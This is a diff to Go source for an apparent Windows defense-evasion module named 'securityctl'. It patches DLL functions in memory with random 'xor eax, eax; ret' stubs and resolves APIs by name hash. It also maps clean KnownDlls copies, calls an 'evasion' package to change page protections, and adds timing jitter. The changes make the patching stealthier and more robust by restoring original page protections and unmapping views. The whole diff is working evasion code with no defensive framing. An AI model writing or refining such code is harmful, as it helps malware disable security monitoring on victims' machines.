@@ -16,10 +16,9 @@ import (
 )
 
 const (
-	patchLen     = 16
-	pageRW       = 0x04
-	pageReadOnly = 0x02
-	pageRX       = 0x20
+	patchLen = 16
+	pageRW   = 0x04
+	pageRX   = 0x20
 )
 
 type funcPatch struct {
@@ -28,6 +27,7 @@ type funcPatch struct {
 	patch    []byte
 	dllName  string
 	funcName string
+	origProt uint32 // original page protection from VirtualQuery
 }
 
 func init() {
@@ -56,24 +56,49 @@ func jitter(min, max time.Duration) {
 
 func randomPatchBytes() []byte {
 	zeroReg := [][]byte{
-		{0x33, 0xC0},
-		{0x31, 0xC0},
-		{0x29, 0xC0},
-		{0x48, 0x31, 0xC0},
-		{0x45, 0x31, 0xC0},
+		{0x33, 0xC0},       // xor eax, eax
+		{0x31, 0xC0},       // xor eax, eax
+		{0x29, 0xC0},       // sub eax, eax
+		{0x48, 0x31, 0xC0}, // xor rax, rax
+		{0x48, 0x31, 0xC0}, // xor rax, rax (second variant)
 	}
 	reg := zeroReg[mrand.Intn(len(zeroReg))]
 	patch := make([]byte, patchLen)
 	copy(patch, reg)
-	patch[len(reg)] = 0xC3
+	patch[len(reg)] = 0xC3 // ret
 	for i := len(reg) + 1; i < patchLen; i++ {
-		patch[i] = 0xCC
+		patch[i] = 0xCC // int3 padding
 	}
 	return patch
 }
 
 func toPtr(u uintptr) unsafe.Pointer {
 	return unsafe.Pointer(uintptr(unsafe.Pointer(nil)) + u)
+}
+
+func queryProtection(addr uintptr) (uint32, error) {
+	k32 := syscall.NewLazyDLL("kernel32.dll")
+	vq := k32.NewProc("VirtualQuery")
+	var mbi = struct {
+		Size              uintptr
+		BaseAddress       uintptr
+		AllocationBase    uintptr
+		AllocationProtect uint32
+		RegionSize        uintptr
+		State             uint32
+		Protect           uint32
+		Type              uint32
+	}{}
+	mbi.Size = unsafe.Sizeof(mbi)
+	r1, _, err := vq.Call(addr&^0xFFF, uintptr(unsafe.Pointer(&mbi)), unsafe.Sizeof(mbi))
+	if r1 == 0 {
+		return 0, fmt.Errorf("securityctl: VirtualQuery failed: %w", err)
+	}
+	prot := mbi.Protect
+	if prot == 0 {
+		prot = pageRX
+	}
+	return prot, nil
 }
 
 func resolveFuncByHash(dllName, funcName string) (*funcPatch, error) {
@@ -94,10 +119,15 @@ func resolveFuncByHash(dllName, funcName string) (*funcPatch, error) {
 	for i := 0; i < patchLen; i++ {
 		orig[i] = *(*byte)(unsafe.Add(fn, i))
 	}
+	origProt, qperr := queryProtection(uintptr(fn))
+	if qperr != nil {
+		origProt = pageRX
+	}
 	jitter(100*time.Microsecond, 500*time.Microsecond)
 	return &funcPatch{
 		addr:     uintptr(fn),
 		orig:     orig,
+		origProt: origProt,
 		dllName:  dllName,
 		funcName: funcName,
 	}, nil
@@ -112,18 +142,28 @@ func resolveFuncFromBase(base uintptr, funcName string) (*funcPatch, error) {
 	for i := 0; i < patchLen; i++ {
 		orig[i] = *(*byte)(unsafe.Add(fn, i))
 	}
+	origProt, qperr := queryProtection(uintptr(fn))
+	if qperr != nil {
+		origProt = pageRX
+	}
 	return &funcPatch{
 		addr:     uintptr(fn),
 		orig:     orig,
+		origProt: origProt,
 		funcName: funcName,
 	}, nil
 }
 
+// resolveFuncFromKnownDlls resolves an export address by mapping a fresh
+// view of the KnownDll section. The returned address is in the NEW mapping,
+// NOT in the already-loaded module. This is useful for reading the on-disk
+// original bytes (for restore) but NOT for patching the live function.
 func resolveFuncFromKnownDlls(dllName, funcName string) (*funcPatch, error) {
 	nt := syscall.NewLazyDLL("ntdll.dll")
 	openSection := nt.NewProc("NtOpenSection")
 	mapView := nt.NewProc("NtMapViewOfSection")
 	closeHandle := nt.NewProc("NtClose")
+	unmapView := nt.NewProc("NtUnmapViewOfSection")
 
 	sectionPath := "\\KnownDlls\\" + dllName
 	u16 := utf16.Encode([]rune(sectionPath))
@@ -178,8 +218,9 @@ func resolveFuncFromKnownDlls(dllName, funcName string) (*funcPatch, error) {
 	}
 
 	fn, err := resolveExportAt(toPtr(base), djb2(funcName))
-	closeHandle.Call(sectionHandle)
 	if err != nil {
+		unmapView.Call(^uintptr(0), base, 0)
+		closeHandle.Call(sectionHandle)
 		return nil, fmt.Errorf("securityctl: resolve from KnownDlls %s: %w", funcName, err)
 	}
 
@@ -188,9 +229,19 @@ func resolveFuncFromKnownDlls(dllName, funcName string) (*funcPatch, error) {
 		orig[i] = *(*byte)(unsafe.Add(fn, i))
 	}
 
+	origProt, qperr := queryProtection(uintptr(fn))
+	if qperr != nil {
+		origProt = pageRX
+	}
+
+	// Unmap the view — we only needed the bytes for orig.
+	unmapView.Call(^uintptr(0), base, 0)
+	closeHandle.Call(sectionHandle)
+
 	return &funcPatch{
 		addr:     uintptr(fn),
 		orig:     orig,
+		origProt: origProt,
 		dllName:  dllName,
 		funcName: funcName,
 	}, nil
@@ -210,7 +261,7 @@ func applyPatch(fp *funcPatch) error {
 		*(*byte)(unsafe.Add(toPtr(fp.addr), i)) = fp.patch[i]
 	}
 	jitter(50*time.Microsecond, 200*time.Microsecond)
-	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, page, 0x1000, pageRX); err != nil {
+	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, page, 0x1000, fp.origProt); err != nil {
 		return fmt.Errorf("securityctl: protect restore: %w", err)
 	}
 	jitter(100*time.Microsecond, 500*time.Microsecond)
@@ -228,7 +279,7 @@ func restorePatch(fp *funcPatch) error {
 	for i := 0; i < len(fp.orig); i++ {
 		*(*byte)(unsafe.Add(toPtr(fp.addr), i)) = fp.orig[i]
 	}
-	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, page, 0x1000, pageRX); err != nil {
+	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, page, 0x1000, fp.origProt); err != nil {
 		return fmt.Errorf("securityctl: protect restore: %w", err)
 	}
 	return nil
